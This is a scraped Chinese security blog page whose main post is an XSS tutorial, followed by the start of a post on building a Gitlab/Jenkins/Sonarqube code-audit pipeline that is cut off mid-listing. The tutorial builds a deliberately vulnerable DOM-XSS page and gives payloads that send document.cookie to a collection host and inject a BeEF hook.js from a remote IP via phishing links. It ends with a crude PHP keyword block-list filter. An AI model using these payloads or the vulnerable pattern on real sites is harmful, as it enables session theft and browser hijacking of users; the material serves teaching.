                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="web安全之XSS漏洞学习实战"><a href="#web安全之XSS漏洞学习实战" class="headerlink" title="web安全之XSS漏洞学习实战"></a>web安全之XSS漏洞学习实战</h2><h3 id="1-编写一个存在XSS漏洞的页面"><a href="#1-编写一个存在XSS漏洞的页面" class="headerlink" title="1.编写一个存在XSS漏洞的页面"></a>1.编写一个存在XSS漏洞的页面</h3><p>编写一个dom形xss。首先html页面：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">	var pos=document.URL.indexOf("name=")+5;</span><br><span class="line">	document.write(decodeURI(document.URL.substring(pos,document.URL.length))); </span><br><span class="line">//1.document.URL表示返回当前页面的URL   2.indexOf表示回某个指定的字符串值在字符串中首次出现的位置。   pos=74(url长度)+5</span><br><span class="line">//1.document.write表示输出内容  2.decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码，decodeURI为解码。 </span><br><span class="line">//3.substring() 方法用于提取字符串中介于两个指定下标之间的字符。substring() 方法返回的子串包括 开始 处的字符，但不包括 结束 处的字符。</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>验证：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578539018013.png" alt="1578539018013"></p>
<h3 id="2-利用XSS"><a href="#2-利用XSS" class="headerlink" title="2.利用XSS"></a>2.利用XSS</h3><p>存在xss漏洞的页面上只需</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(document.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>便可以获取到当前用户的cookie。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540177735.png" alt="1578540177735"></p>
<p>如果对方漏洞为存储型XSS，并且你搭建了xss获取cookie的平台那么只需将下面代码插入漏洞页面中，便可以在cookie平台中获取到对方的cookie。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>window.open('http://xss/cookie.asp?msg='+document.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-利用XSS漏洞还可以做什么。"><a href="#3-利用XSS漏洞还可以做什么。" class="headerlink" title="3.利用XSS漏洞还可以做什么。"></a>3.利用XSS漏洞还可以做什么。</h3><p>3.1 可以在beef上把目标的浏览器作为代理进行操作，可以进行DNS污染等等。</p>
<p>3.2 可以利用mitmf结合社会工程学使用户接受Social Engineering中的模块，让用户安装.exe等更新软件获取shell。</p>
<p>3.3 结合metasploit进一步获取权限。</p>
<p>首先在Beef里构造一个存在漏洞的页面，如下：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540339135.png" alt="1578540339135"></p>
<p>然后利用邮件钓鱼等多种方式诱导用户访问含有XSS漏洞页面：</p>
<p>如： <a href="http://127.0.0.1/domxss.html?name=" target="_blank" rel="noopener">http://127.0.0.1/domxss.html?name=</a><script src="http://192.168.5.54:3000/hook.js"></script></p>
<p>用户点击以后便直接上线：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540669070.png" alt="1578540669070"></p>
<p>然后就可以做很多事件：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540698882.png" alt="1578540698882"></p>
<h3 id="4-如何防御XSS"><a href="#4-如何防御XSS" class="headerlink" title="4.如何防御XSS"></a>4.如何防御XSS</h3><p>xss的防御主要还是集中在代码层，需要过滤非法字符。需要对输入内容进行过滤，输出内容进行编码。</p>
<p>针对php可以用如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($str)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $str = htmlspecialchars($str);</span><br><span class="line">    $str = str_replace( <span class="string">'/'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'('</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">')'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'CR'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x0d'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'LF'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x0a'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">','</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'%'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">';'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'eval'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'open'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'sysopen'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'system'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'$'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">"'"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">"'"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x08'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">""</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;gt"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;lt"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;SCRIPT&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;/SCRIPT&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;script&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;/script&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"select"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"join"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"union"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"where"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"insert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"delete"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"update"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"like"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"drop"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"DROP"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"create"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"modify"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"rename"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"alter"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"cas"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" "</span>,chr(<span class="number">32</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">" "</span>,chr(<span class="number">9</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"    "</span>,chr(<span class="number">9</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,chr(<span class="number">34</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"'"</span>,chr(<span class="number">39</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;br /&gt;"</span>,chr(<span class="number">13</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"''"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"css"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"CSS"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;!--"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"convert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"md5"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"passwd"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"password"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"../"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"./"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"Array"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"or 1='1'"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">";set|set&amp;set;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"`set|set&amp;set`"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"--"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"OR"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">'"'</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"*"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"+"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"'/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-- "</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" -- "</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" --"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"("</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">")"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&#123;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&#125;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-1"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"1"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"."</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"response"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"write"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"|"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"`"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">";"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"etc"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"root"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"//"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"!="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"$"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"=="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"#"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"@"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"mailto:"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"CHAR"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"char"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将非法字符都过滤掉可以一定程度上防止XSS也可以防止SQL注入。</p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/" itemprop="url">基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-24T10:55:34+08:00">
                2020-03-24
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/" class="cy_cmt_count" data-xid="2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/" class="leancloud_visitors" data-flag-title="基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="基于Gitlab-jenkins-Sonarqube-Grafana自动化代码审计平台搭建"><a href="#基于Gitlab-jenkins-Sonarqube-Grafana自动化代码审计平台搭建" class="headerlink" title="基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建"></a>基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建</h2><h5 id="背景：针对项目代码质量管理，在目前的微服务-模块化-快迭代的敏捷开发中。如果仅依赖IDE简单检查和人为的代码审查，对于大量代码很不适合。所以对于高效优异的代码，不仅仅依靠开发人员的对于代码编写的规范，同时也需要一些工具来帮助我们提前预防和强制检测代码规范。由此便产生了基于Gitlab-Jenkins-Sonarqube-Grafana的自动化代码审计监控平台。（PS：就是公司有这个需求）"><a href="#背景：针对项目代码质量管理，在目前的微服务-模块化-快迭代的敏捷开发中。如果仅依赖IDE简单检查和人为的代码审查，对于大量代码很不适合。所以对于高效优异的代码，不仅仅依靠开发人员的对于代码编写的规范，同时也需要一些工具来帮助我们提前预防和强制检测代码规范。由此便产生了基于Gitlab-Jenkins-Sonarqube-Grafana的自动化代码审计监控平台。（PS：就是公司有这个需求）" class="headerlink" title="背景：针对项目代码质量管理，在目前的微服务/模块化/快迭代的敏捷开发中。如果仅依赖IDE简单检查和人为的代码审查，对于大量代码很不适合。所以对于高效优异的代码，不仅仅依靠开发人员的对于代码编写的规范，同时也需要一些工具来帮助我们提前预防和强制检测代码规范。由此便产生了基于Gitlab+Jenkins+Sonarqube+Grafana的自动化代码审计监控平台。（PS：就是公司有这个需求）"></a>背景：针对项目代码质量管理，在目前的微服务/模块化/快迭代的敏捷开发中。如果仅依赖IDE简单检查和人为的代码审查，对于大量代码很不适合。所以对于高效优异的代码，不仅仅依靠开发人员的对于代码编写的规范，同时也需要一些工具来帮助我们提前预防和强制检测代码规范。由此便产生了基于Gitlab+Jenkins+Sonarqube+Grafana的自动化代码审计监控平台。（PS：就是公司有这个需求）</h5><h4 id="1-项目架构："><a href="#1-项目架构：" class="headerlink" title="1.项目架构："></a>1.项目架构：</h4><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320135117408.png" alt="image-20200320135117408"></p>
<h4 id="2-环境以及准备"><a href="#2-环境以及准备" class="headerlink" title="2.环境以及准备:"></a>2.环境以及准备:</h4><table>
<thead>
<tr>
<th>软件或插件名称</th>
<th>版本号</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>Gitlab</td>
<td>v11.0.2</td>
<td></td>
</tr>
<tr>
<td>Jenkins</td>
<td>v2.144</td>
<td></td>
</tr>
<tr>
<td>Sonarqube</td>
<td>v7.9.2</td>
<td></td>
</tr>
<tr>
<td>Grafana</td>
<td>v6.6.2</td>
<td></td>
</tr>
</tbody></table>
<p>针对Gitlab与jenkins通过Webhook进行自动触发构建的相关内容配置我这边不进行叙述了，网上这方面文章很多，我会着重讲后面内容。</p>
<h4 id="3-Jenkins与Sonarqube联动"><a href="#3-Jenkins与Sonarqube联动" class="headerlink" title="3.Jenkins与Sonarqube联动:"></a>3.Jenkins与Sonarqube联动:</h4><h5 id="3-1首先需要在Sonarqube里面生成一个Sonarqube的令牌，用来给Jenkins使用。在如下地方设置："><a href="#3-1首先需要在Sonarqube里面生成一个Sonarqube的令牌，用来给Jenkins使用。在如下地方设置：" class="headerlink" title="3.1首先需要在Sonarqube里面生成一个Sonarqube的令牌，用来给Jenkins使用。在如下地方设置："></a>3.1首先需要在Sonarqube里面生成一个Sonarqube的令牌，用来给Jenkins使用。在如下地方设置：</h5><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320143031931.png" alt="image-20200320143031931"></p>
<h5 id="3-2-在jenkins上部署，SonarQube-Scanner-扫描插件："><a href="#3-2-在jenkins上部署，SonarQube-Scanner-扫描插件：" class="headerlink" title="3.2 在jenkins上部署，SonarQube Scanner 扫描插件："></a>3.2 在jenkins上部署，SonarQube Scanner 扫描插件：</h5><p>在jenkins中安装插件：SonarQube Scanner for jenkins，如下：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320143445564.png" alt="image-20200320143445564"></p>
<p>网页登录jenkins,在Manage Jenkins—-Global Tool Conﬁguration—-SonarQube Scanner模块中配置 如下设置：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320143510707.png" alt="image-20200320143510707"></p>
<p>添加Sonarqube凭证，在凭据-系统中添加全局凭据，类型为Secret text并添加如下token（3.1中的token）。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320143538518.png" alt="image-20200320143538518"></p>
<p>然后在Manage Jenkins—conﬁguration模块下面Sonarqube servers中如下添加： </p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320143607417.png" alt="image-20200320143607417"></p>
<p>然后在job构建中添加如下信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sonar.projectKey=demo  (项目名字)</span><br><span class="line">sonar.projectName=demo  (项目名字) </span><br><span class="line">sonar.language=java sonar.java.binaries=/tmp </span><br><span class="line">sonar.sources=./ </span><br><span class="line">sonar.java.source=<span class="number">1.8</span></span><br><span class="line">sonar.projectVersion=<span class="number">1.0</span></span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320145620799.png" alt="image-20200320145620799"></p>
<h5 id="3-3-效果如下："><a href="#3-3-效果如下：" class="headerlink" title="3.3 效果如下："></a>3.3 效果如下：</h5><h6 id="3-3-1-提交代码到gitlab："><a href="#3-3-1-提交代码到gitlab：" class="headerlink" title="3.3.1 提交代码到gitlab："></a>3.3.1 提交代码到gitlab：</h6><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320145843614.png" alt="image-20200320145843614"></p>
<h6 id="3-3-2-gitlab通过webhook自动触发jenkins执行任务"><a href="#3-3-2-gitlab通过webhook自动触发jenkins执行任务" class="headerlink" title="3.3.2 gitlab通过webhook自动触发jenkins执行任务"></a>3.3.2 gitlab通过webhook自动触发jenkins执行任务</h6><h6 id="3-3-3-jenkins获取代码，执行sonar分析代码"><a href="#3-3-3-jenkins获取代码，执行sonar分析代码" class="headerlink" title="3.3.3 jenkins获取代码，执行sonar分析代码"></a>3.3.3 jenkins获取代码，执行sonar分析代码</h6><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320145921676.png" alt="image-20200320145921676"></p>
<h6 id="3-3-4-在sonar的服务器界面查看分析结果"><a href="#3-3-4-在sonar的服务器界面查看分析结果" class="headerlink" title="3.3.4 在sonar的服务器界面查看分析结果"></a>3.3.4 在sonar的服务器界面查看分析结果</h6><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320145955343.png" alt="image-20200320145955343"></p>
<h4 id="4-Sonarqube与Grafana联动"><a href="#4-Sonarqube与Grafana联动" class="headerlink" title="4. Sonarqube与Grafana联动:"></a>4. Sonarqube与Grafana联动:</h4><p>首先需要安装influnxdb与Grafana安装环境省略官网均有。</p>
<p>然后写一个Sonarqube数据采集器，具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 